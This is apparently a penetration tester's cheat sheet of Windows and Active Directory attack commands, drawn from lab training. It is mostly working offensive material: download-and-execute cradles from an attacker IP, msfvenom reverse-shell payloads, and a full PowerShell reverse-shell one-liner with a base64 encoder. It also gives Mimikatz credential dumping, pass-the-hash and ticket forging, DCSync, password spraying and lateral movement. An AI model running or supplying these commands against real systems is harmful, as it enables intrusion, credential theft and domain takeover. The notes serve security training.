# Windows Handy Commands

### RDP From Linux
```bash
xfreerdp /u:"user" /d:"domain" /p:"password" /v:"target_ip"

xfreerdp /cert-ignore /compression /auto-reconnect /u:USERNAME /p:PASSWORD /v:IP_ADDRESS

xfreerdp +bitmap-cache /compression-level:2 /kbd:40A  /u:USERNAME /p:PASSWORD /v:IP_ADDRESS  /size:1500x1300

xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /drive:tmp,. /u:USERNAME  /p:PASSWORD /v:IP_ADDRESS

rdesktop -u USERNAME -p PASSWORD -a 16 -P -z -b -g 1280x860 IP_ADDRESS

```

---

### Sending Scripts

```PowerShell
# Several files
$baseUrl = "http://192.168.45.222:$PORT/" # attacker ip
$fileNames = @("file1.txt", "file2.txt", "file3.txt")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
}

# Download and save shell to tasks
Invoke-WebRequest -Uri 'http://192.168.45.222:$PORT' -OutFile 'C:\Windows\Tasks\shell.exe'; Start-Process -NoNewWindow -FilePath 'C:\Windows\Tasks\shell.exe'

# PowerView / SharpView
iex(new-object net.webclient).downloadstring('http://192.168.45.222:$PORT/PowerView.ps1'); DomainTrustMapping Get-DomainComputer -Domain <DOMAIN> | Resolve-IPAddress
iex(new-object net.webclient).downloadstring('http://192.168.45.222:$PORT/Invoke-SharpView.ps1')
# Obfuscated SharpView
iwr 'http://192.168.45.222:$PORT/ObfSharpView.exe' -OutFile 'C:\Windows\Tasks\obfsharpview.exe'

# Get all Domains
$domains = @("domain1", "domain2", "domain3")
foreach ($domain in $domains) { Get-DomainComputer -Domain $domain | Resolve-IPAddress }

# PowerUp / SharpUp
iex(new-object net.webclient).downloadstring('http://192.168.45.222:$PORT/PowerUp.ps1'); Invoke-AllChecks;
iex(new-object net.webclient).downloadstring('http://192.168.45.222:$PORT/Invoke-SharpUp.ps1')

# Turtle Toolkit
$a = [System.Reflection.Assembly]::Load($(IWR -Uri 'http://192.168.45.222:$PORT/TurtleToolKit.dll' -UseBasicParsing).Content); Import-Module -Assembly $a;

# Invoke BloodHound
iex(new-object net.webclient).downloadstring('http://192.168.45.222:$PORT/Invoke-Sharphound.ps1'); Invoke-Sharphound -CollectionMethod All,GPOLocalGroup -Domain <DomainName>;
Invoke-SharpHound -CollectionMethod All -Domain <DomainName2>; Invoke-SharpHound -CollectionMethod All -Domain <DomainName3>;
# Sharphound.exe
iwr 'http://192.168.45.222:$PORT/SharpHound.exe' -OutFile 'C:\Windows\Tasks\SharpHound.exe'
```

---

### Force to Reset Password

```PowerShell
iex(new-object net.webclient).downloadstring('http://192.168.45.222$PORT/PowerView.ps1');
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force;
$Cred = New-Object System.Management.Automation.PSCredential ("DomainName\UserName", (ConvertTo-SecureString "FGjksdff89sdfj" -AsPlainText -Force));
Set-DomainUserPassword -Identity jeff -AccountPassword $UserPasword -Credential $Cred;

$SecPassword = ConvertTo-SecureString '<ExistingPassword>' -AsPlainText -Force;
$Cred = New-Object System.Management.Automation.PSCredential ("DomainName\UserName", $SecPassword);
Set-DomainUserPasword-Identity jeff -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred -Verbose;

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force;
$Cred = New-Object System.Management.Automation.PSCredential('DomainName\UserName', $SecPassword);
Set-DomainObject -Identity <UserName> -Set @{"scriptpath"="\\$ip\share\<file>.bat"} -Credential $Cred -Verbose # batfile can contain powershell command.
```

---

### PS-Session (Lateral Movement)
```PowerShell
# create a credential and use it to move laterally.
# we need to have a username & password for this to work.
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
# ---------------------- #
# PS SESSION CREATION    #
# ---------------------- #
New-PSSession -ComputerName 192.168.214.73 -Credential $credential # computer you want to move to.
# Output
# Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
# -- ----            ------------    ------------    -----         -----------------     ------------
# 1 WinRM1          192.168.214.72  RemoteMachine   Opened        Microsoft.PowerShell     Available
Enter-PSSession 1 # session ID [1]
```

---

### MSF-Venom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=445 -f hta-psh -o shell.hta
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=445 -f exe -o shell_445.exe
msfvenom -p windows/shell/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell_443.exe # non meterpreter shell.
# other payloads 


```

---

### Mimikatz
#### Passing the Hash
**General Theory**
- Usually the PTH technique does not work with Kerberos Authentication.
- Different Applications provide different ways to use the PTH techniques.
    - MimiKatz toolkit has the `/pth:` for users to pass in the NTLM hashes.
    - XFREERDP has the `/pth:` parameter in case you dont have the cleartext password.
- Make sure hashes start with a colon in case things don't work out `':'`.

**Converting a KerbTGT into a TGS & Use Any Service in the context of a different user:**
1. Log into a system as `offsec` & get the cached NTLM of another user - `jen`.
2. Now, use the `sekurlsa::pth` module to pass the hash and create a powershell session in the context of this new user - `jen`.
3. Now use the `klist` command to see that no credentials are cached. To cache the KerbTGT, we will try to access some service as jen, but from the commandline.
4. Use the `\\web04` network file share using the `net use \\web04` command. Since the powershell session is running as jen, her **TGT and TGS** will be cached. This can be confirmed with `klist`.
5. Once we have the TGS, this means we can use any service as jen. So we will use `.\PSExec \\web04 cmd` to gain shell as jen with high privs.
**Passing the Ticket**
- TGT is good for authenticating for gaining shells. However, it is TGS provides more flexibility. We can use the `sekurlsa::tickets /export` command to dump all the TGS tickets into the working directory.
- Then you can simply use the `kerberos::ptt` command, and paste one of the ticket names which ends in the `.kirbi` extention.

#### Understanding DC-Sync
`sekurlsa::dcsync`
- Domain controllers sync using DRS replication.
- DRS allows updates via the IDL_DRSGetNCChanges API.
- Domain controllers don't verify update request origins.
- They only check if the requesting SID has necessary privileges.
- Attackers can exploit this to issue rogue updates if they have sufficient rights.
- Privs for the attack to work are - `Replicating Directory Changes`, `Replicating Directory Changes All` and `Replicating Directory Changes in Filtered Set`
- Be a part of the `Domain Admins`, `Enterprise Admins` or `Local Administrators` group.

```PowerShell
# -------------------- #
# General Commands
# -------------------- #
token::elevate
privilege::debug
log
sekurlsa::logonpasswords
sekurlsa::pth /user:maria /ntlm:2a944a58d4ffa77137b2c587e6ed7626 /domain:corp.com # passing the hash

# -------------------- #
# LSADUMP
# -------------------- #
lsadump::dcsync /domain:hacklab.local /user:hacklab\Administrator
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::lsa /patch # the /patch command gives you more sensitive imformation by going throught the LSASS Memory.

# -------------------- #
# Pass The Hash
# -------------------- #
# pass the hash of a different user & get a shell session.
sekurlsa::pth /user:jen /domain:corp.com /ntlm:[HASH] /run:powershell # try by appending a colon (:) before the hash if it does not work.

# -------------------- #
# Pass The Ticket
# -------------------- #
# exporting tickets
sekurlsa::tickets /export # exports all tickets in the Current Working Directory.
# passing the ticket
kerberos::ptt [0;147d3d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi # example ticket name ends in .kirbi extention.
# check with the command 'klist'.

# -------------------- #
# Silver Tickets - TGT
# -------------------- #
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
# RC4 keys are used to encrypt Service Tickets.
# cmd:> klist can be used to see the cached tickets.

# -------------------- #
# Golden Tickets - TGS
# -------------------- #
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:[KerbtgtAccountHash] /ptt
# once a TGT is generated in the current user's name, run cmd:
misc::cmd # this will run the cmd with jen's tiket in action.
# next steps...
.\PSExec.exe \\dc1 cmd.exe # or powershell
# current user will be added to the domain admins group becuase of the ticket.


```

---

### PSExec 
```PowerShell
PSExec.exe \\dc01 cmd # or use the IP of the domain you want to connect to.
# while providing creds in one like use the - [$DOMAIN NAME]\[$USERNAME]:[$PASSWORD]
.\PSExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

---

### CrackMapExec (NetExec)
```bash
# spray passwords
cme 192.168.216.70-75 -u users.txt -p passwords.txt -d corp.com --continue-on-success

```

---

### XFreeRDP
```bash
xfreerdp /u:'Username' /p:'Password' /v:'IPAddress' /d:'domain' /pth:'hash' /cert:ignore
```

---

### Impacket-WMIExec.py
```bash
# Make sure you try starting the hash with the ':' symbol.
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
# wmiexec is a tool that is used gain a shell if you have the creds.
```

---

### Impacket-Secretsdump.py
```bash
## Secrets consists of -
# * Cached Domain Credentials
# * Kerberos Tickets
# * DPAPI Master Keys
# * Service Account Credentials

# using a plaintext password
secretsdump -outputfile 'something' 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'

# with Pass-the-Hash
secretsdump -outputfile 'something' -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'

# with Pass-the-Ticket
secretsdump -k -outputfile 'something' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
```

---

### NTLMRelayx.py
```bash
# target vulnerable to Zerologon, dump DC's secrets only
ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'

# target vulnerable to Zerologon, dump Domain's secrets
ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'
```

---

### Hashcat For Windows
| Hash Type                          | Hashcat Mode |
| ---------------------------------- | ------------ |
| LM Hash                            | 3000         |
| NT Hash                            | 1000         |
| NTLM Response                      | 5500         |
| NTLMv2 Response                    | 5600         |
| (DCC1) Domain Cached Creds         | 1100         |
| (DCC2) Domain Cached Creds 2       | 2100         |
| AS-REQ-roast                       | 7500         |
| AS-REP-roast                       | 18200        |
| Kerberoast                         | 13100        |
| PostgreSQL Hash (PBKDF2-HMAC-SHA1) | 12001        | 

```bash
hashcat -a 0 -m [mode] -r [rule_file] --force # use the --show flag to show passwords.
```

### WMI & WINRM
```PowerShell
# Performing a lateral movement through CMD
wmic /node:192.168.216.73 /user:jen /password:Nexus123! process call create 'calc' # enter the reverse shell script instead of calc

# Performing a lateral movement through PS
# First create a PS credential
$username = 'jen'; # user you want to go to.
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

# Next, setup a reverse shell
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSesstion -ComputerName 192.168.216.75 -Credential $credential -SessionOption $options
$command = 'put reverse shell here';

# Launch the reverse shell with the target user
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$command};
```

### Python Base64 - Encoder
```python
#!/usr/bin/env python

import base64
def encode(data):
    encoded = base64.b64encode(data.encode('utf-8') if isinstance(data, str) else data)
    return encoded.decode('utf-8')

command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.222",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

print(encode(command));


```

### Passing the Hash

##### General Theory
- Usually the PTH technique does not work with Kerberos Authentication.
- Different Applications provide different ways to use the PTH techniques.
	- MimiKatz toolkit has the `/pth:` for users to pass in the NTLM hashes.
	- XFREERDP has the `/pth:` parameter in case you dont have the cleartext password.
- Make sure hashes start with a colon in case things don't work out  `':'`.

##### Converting a KerbTGT into a TGS & Use Any Service in the context of a different user:
1. Log into a system as `offsec` & get the cached NTLM of another user - `jen`.
2. Now, use the `sekurlsa::pth` module to pass the hash and create a powershell session in the context of this new user - `jen`.
3. Now use the `klist` command to see that no credentials are cached. To cache the KerbTGT, we will try to access some service as jen, but from the commandline.
4. Use the `\\web04` network file share using the `net use \\web04` command. Since the powershell session is running as jen, her **TGT and TGS** will be cached. This can be confirmed with `klist`.
5. Once we have the TGS, this means we can use any service as jen. So we will use `.\PSExec \\web04 cmd` to gain shell as jen with high privs. 

##### Passing the Ticket
- TGT is good for authenticating for gaining shells. However, it is TGS provides more flexibility. We can use the `sekurlsa::tickets /export` command to dump all the TGS tickets into the working directory.
- Then you can simply use the `kerberos::ptt` command, and paste one of the ticket names which ends in the `.kirbi` extention.
